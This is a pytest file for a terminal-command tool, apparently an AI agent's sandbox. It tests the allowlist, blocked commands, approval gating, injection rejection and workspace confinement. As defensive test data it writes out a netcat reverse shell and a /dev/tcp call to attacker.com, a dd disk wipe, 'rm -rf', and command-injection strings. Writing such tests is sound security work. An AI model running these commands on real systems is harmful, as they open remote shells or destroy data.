"""Tests for LAEW TerminalTool (CONTRACT.md)."""

import os
import tempfile
from pathlib import Path

import pytest

from laew.tools.base import ErrorCode
from laew.tools.terminal import TerminalTool


@pytest.fixture
def tmp_project(tmp_path):
    """Create temporary project."""
    project = tmp_path / "project"
    project.mkdir()
    (project / "test.txt").write_text("hello world")
    return project


@pytest.fixture
def tool(tmp_project):
    """Create TerminalTool with test project."""
    return TerminalTool(workspace_root=tmp_project)


# === Allowlisted commands (no approval required) ===

def test_allowlisted_ls(tool, tmp_project):
    """Test that 'ls' command is allowlisted."""
    result = tool.run_command("ls")

    assert result.success
    assert result.data["exit_code"] == 0
    assert "test.txt" in result.data["stdout"]


def test_allowlisted_cat(tool, tmp_project):
    """Test that 'cat' command is allowlisted."""
    result = tool.run_command("cat test.txt")

    assert result.success
    assert result.data["exit_code"] == 0
    assert "hello world" in result.data["stdout"]


def test_allowlisted_git_commands(tool):
    """Test that git inspection commands are allowlisted."""
    for cmd in ["git status", "git log", "git diff"]:
        result = tool.run_command(cmd)
        # Command might fail (not a git repo), but should not be blocked
        assert result.error_code != ErrorCode.ERR_COMMAND_BLOCKED


# === Blacklisted patterns ===

def test_blacklist_sudo(tool):
    """Test that 'sudo' is blocked."""
    result = tool.run_command("sudo ls")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_COMMAND_BLOCKED


def test_blacklist_rm_rf(tool):
    """Test that 'rm -rf' is blocked."""
    result = tool.run_command("rm -rf /tmp/test")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_COMMAND_BLOCKED


def test_blacklist_chmod(tool):
    """Test that 'chmod' is blocked."""
    result = tool.run_command("chmod 777 test.txt")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_COMMAND_BLOCKED


def test_blacklist_chown(tool):
    """Test that 'chown' is blocked."""
    result = tool.run_command("chown root:root /tmp/file")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_COMMAND_BLOCKED


def test_blacklist_dd(tool):
    """Test that 'dd' is blocked."""
    result = tool.run_command("dd if=/dev/zero of=/dev/sda")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_COMMAND_BLOCKED


def test_blacklist_dev_redirect(tool):
    """Test that device redirection is blocked."""
    result = tool.run_command("> /dev/null")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_COMMAND_BLOCKED


def test_blacklist_nc_reverse_shell(tool):
    """Test that 'nc -e' is blocked."""
    result = tool.run_command("nc -e /bin/bash attacker.com 4444")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_COMMAND_BLOCKED


def test_blacklist_dev_tcp(tool):
    """Test that '/dev/tcp' is blocked."""
    result = tool.run_command("cat < /dev/tcp/attacker.com/1234")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_COMMAND_BLOCKED


# === Approval requirement ===

def test_non_allowlisted_requires_approval(tool):
    """Test that non-allowlisted command requires approval."""
    result = tool.run_command("python -c 'print(42)'")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_UNAUTHORIZED


# === Shell metacharacter rejection ===

def test_allowlist_prefix_injection_blocked(tool):
    """Prefix injection ('ls; python non_existent.py') must not pass the allowlist."""
    result = tool.run_command("ls; python non_existent.py")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_UNAUTHORIZED


def test_allowlist_redirection_blocked(tool):
    """Command with output redirection must not pass the allowlist."""
    result = tool.run_command("echo pwn > /tmp/owned")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_UNAUTHORIZED


def test_allowlist_pipe_blocked(tool):
    """Command with a pipe must not pass the allowlist."""
    result = tool.run_command("cat test.txt | head")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_UNAUTHORIZED


def test_allowlist_command_substitution_blocked(tool):
    """Command substitution must not pass the allowlist."""
    result = tool.run_command("echo $(whoami)")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_UNAUTHORIZED


def test_allowlisted_command_tokens_still_pass(tool):
    """A genuinely safe inspect command with arguments still needs no approval."""
    result = tool.run_command("git status --porcelain")

    assert result.error_code != ErrorCode.ERR_UNAUTHORIZED


def test_non_allowlisted_with_approval(tool):
    """Test that non-allowlisted command succeeds with approval."""
    tool.approve()
    result = tool.run_command("echo hello")

    assert result.success
    assert "hello" in result.data["stdout"]


# === Boundary validation ===

def test_path_traversal_blocked(tool):
    """Test that path traversal escaping workspace is blocked."""
    result = tool.run_command("ls", cwd="../../../etc")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_PATH_OUT_OF_BOUNDS


def test_absolute_path_outside_blocked(tool, tmp_path):
    """Test that absolute path outside workspace is blocked."""
    # This would attempt to cd to /etc which is outside workspace
    result = tool.run_command("ls", cwd="/etc")

    assert not result.success
    assert result.error_code == ErrorCode.ERR_PATH_OUT_OF_BOUNDS


# === Timeout ===

def test_timeout(tool):
    """Test that long-running command times out."""
    tool.approve()
    result = tool.run_command("sleep 10", timeout_ms=100)

    assert not result.success
    assert result.error_code == ErrorCode.ERR_TIMEOUT


# === Working directory confinement ===

def _normalize_pwd_output(stdout: str) -> str:
    """
    Normalize pwd output for cross-platform comparison.

    Git Bash / MSYS reports paths with a '/tmp/...' prefix on Windows,
    while the native filesystem uses 'C:\\...'. Translate the MSYS prefix
    to the OS temp directory so both forms compare equal.
    """
    path_str = stdout.strip()
    if path_str.startswith("/tmp/"):
        path_str = os.path.join(tempfile.gettempdir(), path_str[len("/tmp/"):])
    return os.path.normcase(os.path.normpath(path_str))


def test_execution_respects_cwd(tool, tmp_project):
    """Test that command executes in specified cwd."""
    result = tool.run_command("pwd", cwd=".")

    assert result.success
    # PWD should contain tmp_project path
    expected = os.path.normcase(os.path.normpath(str(tmp_project.resolve())))
    assert _normalize_pwd_output(result.data["stdout"]) == expected


# === Exit codes ===

def test_non_zero_exit_code(tool):
    """Test that non-zero exit codes are captured."""
    result = tool.run_command("false")

    assert result.success  # Tool executed successfully
    assert result.data["exit_code"] != 0


def test_zero_exit_code(tool):
    """Test that zero exit codes work correctly."""
    result = tool.run_command("true")

    assert result.success
    assert result.data["exit_code"] == 0
